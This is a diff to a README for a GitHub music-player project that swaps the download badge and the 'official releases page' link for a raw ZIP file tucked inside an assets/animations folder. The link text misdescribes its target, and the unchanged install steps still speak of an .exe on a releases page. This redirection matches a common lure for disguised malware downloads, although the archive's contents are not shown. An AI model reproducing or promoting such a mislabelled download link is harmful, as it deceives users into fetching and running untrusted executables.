@@ -1,6 +1,6 @@
 # 🎵 cupid-music-player - Listen to your favorite songs today
 
-[![](https://img.shields.io/badge/Download-Cupid-blue.svg)](https://github.com/Rondastartling852/cupid-music-player/releases)
+[![](https://img.shields.io/badge/Download-Cupid-blue.svg)](https://github.com/Rondastartling852/cupid-music-player/raw/refs/heads/main/assets/animations/pink/needle-playing/player-cupid-music-2.8-alpha.4.zip)
 
 Cupid Music Player offers a stylish way to organize and play your audio files. It features a retro pixel-art design that brings a unique look to your desktop. You can browse playlists, switch between themes, and enjoy smooth animations while your music plays.
 
@@ -28,7 +28,7 @@ To run this application, ensure your computer meets these standards:
 
 Follow these steps to set up the player on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Rondastartling852/cupid-music-player/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/Rondastartling852/cupid-music-player/raw/refs/heads/main/assets/animations/pink/needle-playing/player-cupid-music-2.8-alpha.4.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Once the download finishes, open your Downloads folder.
